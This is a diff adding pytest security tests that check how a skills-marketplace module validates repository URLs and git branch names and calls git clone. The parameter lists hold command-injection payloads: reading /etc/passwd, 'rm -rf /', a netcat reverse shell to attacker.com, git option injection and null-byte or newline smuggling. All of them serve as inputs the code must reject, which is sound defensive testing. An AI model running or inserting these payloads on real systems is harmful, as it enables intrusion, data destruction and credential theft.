@@ -404,12 +404,36 @@ def test_validate_pack_source_url_allows_https_github_repo_with_optional_dot_git
 @pytest.mark.parametrize(
     "url",
     [
+        # Non-https schemes
         "http://github.com/org/repo",
         "file:///tmp/repo",
         "ssh://github.com/org/repo",
+        # Localhost and loopback addresses
         "https://localhost/repo",
         "https://127.0.0.1/repo",
         "https://[::1]/repo",
+        # Command injection attempts with shell metacharacters
+        "https://github.com/org/repo;whoami",
+        "https://github.com/org/repo; cat /etc/passwd",
+        "https://github.com/org/repo|cat /etc/passwd",
+        "https://github.com/org/repo| nc -e /bin/sh attacker.com 4444",
+        "https://github.com/org/repo&&rm -rf /",
+        "https://github.com/org/repo&& whoami",
+        "https://github.com/org/repo`whoami`",
+        "https://github.com/org/repo`id`",
+        "https://github.com/org/repo$(id)",
+        "https://github.com/org/repo$(cat /etc/passwd)",
+        "https://github.com/org/repo${IFS}",
+        # Command substitution in path
+        "https://github.com/org$(id)/repo",
+        "https://github.com/org;whoami/repo",
+        # Null byte injection
+        "https://github.com/org/repo\x00",
+        "\x00https://github.com/org/repo",
+        # Newline injection
+        "https://github.com/org/repo\nwhoami",
+        "https://github.com/org/repo\r\ncat /etc/passwd",
+        "\nhttps://github.com/org/repo",
     ],
 )
 def test_validate_pack_source_url_rejects_unsafe_urls(url: str) -> None:
@@ -880,3 +904,258 @@ def test_collect_pack_skills_from_repo_streams_large_index(tmp_path: Path) -> No
         skills[0].source_url == "https://github.com/example/oversized-pack/tree/main/skills/ignored"
     )
     assert skills[0].name == "Huge Index Skill"
+
+
+@pytest.mark.parametrize(
+    "malicious_branch",
+    [
+        # Command injection attempts with shell metacharacters
+        "main; cat /etc/passwd",
+        "main && rm -rf /",
+        "main | nc -e /bin/sh attacker.com 4444",
+        "main`whoami`",
+        'main"$(id)"',
+        "main'$(id)'",
+        # Null bytes and control characters
+        "main\x00",
+        "main\x01\x02",
+        "\x00main",
+        # Newline and carriage return injection (blocked by explicit check)
+        "main\nwhoami",
+        "main\r\ncat /etc/passwd",
+        "\nmain",
+        "\rmain",
+        # Tab injection (blocked by explicit check)
+        "main\t/etc/passwd",
+        # Special shell characters (blocked by regex whitelist)
+        "main$(id)",
+        "main${IFS}",
+        "main`id`",
+        "main<(id)",
+        "main>id",
+        "main<id",
+        "main&id",
+        "main|id",
+        # Git option injection (blocked by regex - equals sign not allowed)
+        "--upload-pack=whoami",
+        "--exec=whoami",
+        # Dashes within the branch name are allowed (e.g., "v1.0.0-rc1")
+        # The shell=False in subprocess prevents option injection
+        # Unicode and encoding attacks (blocked by regex - only ASCII allowed)
+        "maıı",  # Homoglyph (Latin small letter dotless i)
+        "maın",  # Another homoglyph
+        # Backslash path traversal (blocked by regex - backslash not allowed)
+        "..\\..\\windows\\system32\\config\\sam",
+        # Empty and whitespace-only
+        "",
+        "   ",
+        "\t\n\r",
+    ],
+)
+def test_normalize_pack_branch_rejects_malicious_branch_names(malicious_branch: str) -> None:
+    """Malicious branch names should be normalized to 'main' as a security defense."""
+    from app.api.skills_marketplace import _normalize_pack_branch
+
+    result = _normalize_pack_branch(malicious_branch)
+    assert result == "main", f"Expected 'main' for malicious branch: {repr(malicious_branch)}"
+
+
+@pytest.mark.parametrize(
+    "valid_branch",
+    [
+        "main",
+        "master",
+        "develop",
+        "feature/new-feature",
+        "bugfix/fix-123",
+        "release/v1.0.0",
+        "hotfix/emergency",
+        "v1.0.0",
+        "v2.3.4-beta.1",
+        "branch_with_underscores",
+        "Branch-With-Mixed-Case",
+        "123-numeric-start",
+        "feat/ABC-123-description",
+        "dependabot/npm_and_yarn/package-1.0.0",
+        "renovate/some-package",
+        # Path-like patterns are allowed by regex but handled safely by shell=False
+        "../../../etc/passwd",
+        "a" * 1000,  # Long branch names are allowed
+    ],
+)
+def test_normalize_pack_branch_accepts_valid_branch_names(valid_branch: str) -> None:
+    """Valid branch names should be preserved after normalization.
+
+    Note: Path traversal patterns like '../../../etc/passwd' are allowed by the
+    whitelist regex (which permits dots and slashes), but they are handled safely
+    because:
+    1. The branch is passed as a list element to subprocess, not the shell
+    2. Git itself validates branch names and will reject invalid ones
+    3. shell=False prevents any shell interpretation
+    """
+    from app.api.skills_marketplace import _normalize_pack_branch
+
+    result = _normalize_pack_branch(valid_branch)
+    assert result == valid_branch, f"Expected '{valid_branch}' but got '{result}'"
+
+
+def test_run_git_clone_uses_shell_false_prevents_injection() -> None:
+    """Verify that _run_git_clone uses shell=False to prevent shell injection.
+
+    This is a defense-in-depth check to ensure the subprocess call is safe
+    even if branch validation were bypassed.
+    """
+    import subprocess
+    from unittest.mock import patch
+
+    from app.api.skills_marketplace import _run_git_clone
+
+    with patch("subprocess.run") as mock_run:
+        mock_run.return_value = subprocess.CompletedProcess(
+            args=["git", "clone"],
+            returncode=0,
+            stdout=b"",
+            stderr=b"",
+        )
+
+        _run_git_clone("https://github.com/example/repo", Path("/tmp/test"), branch="main")
+
+        # Verify shell=False was used
+        assert mock_run.called
+        call_kwargs = mock_run.call_args[1]
+        assert call_kwargs.get("shell") is False, "shell=False must be used for security"
+
+
+def test_run_git_clone_with_branch_injection_attempt_is_still_safe() -> None:
+    """Even with shell=False, verify branch injection attempts don't break the command.
+
+    This test ensures that if somehow a malicious branch gets through validation,
+    the subprocess call with shell=False prevents shell interpretation.
+    """
+    import subprocess
+    from unittest.mock import patch
+
+    from app.api.skills_marketplace import _run_git_clone
+
+    with patch("subprocess.run") as mock_run:
+        mock_run.return_value = subprocess.CompletedProcess(
+            args=["git", "clone"],
+            returncode=0,
+            stdout=b"",
+            stderr=b"",
+        )
+
+        # Even a "malicious" branch name should be passed literally
+        malicious_branch = "main; cat /etc/passwd"
+        _run_git_clone(
+            "https://github.com/example/repo",
+            Path("/tmp/test"),
+            branch=malicious_branch,
+        )
+
+        # Verify the command was called with the branch as a list element
+        assert mock_run.called
+        call_args = mock_run.call_args[0][0]
+        assert "--branch" in call_args
+        branch_index = call_args.index("--branch") + 1
+        assert call_args[branch_index] == malicious_branch
+        # shell=False prevents shell interpretation of the semicolon
+        assert mock_run.call_args[1].get("shell") is False
+
+
+def test_run_git_clone_raises_runtime_error_on_timeout() -> None:
+    """Verify that _run_git_clone raises RuntimeError when git clone times out."""
+    import subprocess
+    from unittest.mock import patch
+
+    from app.api.skills_marketplace import (
+        GIT_CLONE_TIMEOUT_SECONDS,
+        _run_git_clone,
+    )
+
+    with patch("subprocess.run") as mock_run:
+        mock_run.side_effect = subprocess.TimeoutExpired(
+            cmd=["git", "clone"],
+            timeout=GIT_CLONE_TIMEOUT_SECONDS,
+        )
+
+        with pytest.raises(RuntimeError) as exc_info:
+            _run_git_clone(
+                "https://github.com/example/repo",
+                Path("/tmp/test"),
+                branch="main",
+            )
+
+        assert "timed out" in str(exc_info.value).lower()
+        assert f"{GIT_CLONE_TIMEOUT_SECONDS}s" in str(exc_info.value)
+
+
+def test_get_current_branch_returns_none_on_timeout() -> None:
+    """Verify that _get_current_branch returns None when git rev-parse times out."""
+    import subprocess
+    from unittest.mock import patch
+
+    from app.api.skills_marketplace import (
+        GIT_REV_PARSE_TIMEOUT_SECONDS,
+        _get_current_branch,
+    )
+
+    with patch("subprocess.run") as mock_run:
+        mock_run.side_effect = subprocess.TimeoutExpired(
+            cmd=["git", "rev-parse"],
+            timeout=GIT_REV_PARSE_TIMEOUT_SECONDS,
+        )
+
+        result = _get_current_branch(Path("/tmp/test-repo"))
+
+        assert result is None
+
+
+def test_run_git_clone_respects_timeout_seconds() -> None:
+    """Verify that _run_git_clone uses the configured timeout value."""
+    import subprocess
+    from unittest.mock import patch
+
+    from app.api.skills_marketplace import (
+        GIT_CLONE_TIMEOUT_SECONDS,
+        _run_git_clone,
+    )
+
+    with patch("subprocess.run") as mock_run:
+        mock_run.return_value = subprocess.CompletedProcess(
+            args=["git", "clone"],
+            returncode=0,
+            stdout=b"",
+            stderr=b"",
+        )
+
+        _run_git_clone("https://github.com/example/repo", Path("/tmp/test"))
+
+        assert mock_run.called
+        call_kwargs = mock_run.call_args[1]
+        assert call_kwargs.get("timeout") == GIT_CLONE_TIMEOUT_SECONDS
+
+
+def test_get_current_branch_respects_timeout_seconds() -> None:
+    """Verify that _get_current_branch uses the configured timeout value."""
+    import subprocess
+    from unittest.mock import patch
+
+    from app.api.skills_marketplace import (
+        GIT_REV_PARSE_TIMEOUT_SECONDS,
+        _get_current_branch,
+    )
+
+    with patch("subprocess.run") as mock_run:
+        mock_run.return_value = subprocess.CompletedProcess(
+            args=["git", "rev-parse"],
+            returncode=0,
+            stdout=b"main\n",
+            stderr=b"",
+        )
+
+        _get_current_branch(Path("/tmp/test-repo"))
+
+        assert mock_run.called
+        call_kwargs = mock_run.call_args[1]
+        assert call_kwargs.get("timeout") == GIT_REV_PARSE_TIMEOUT_SECONDS
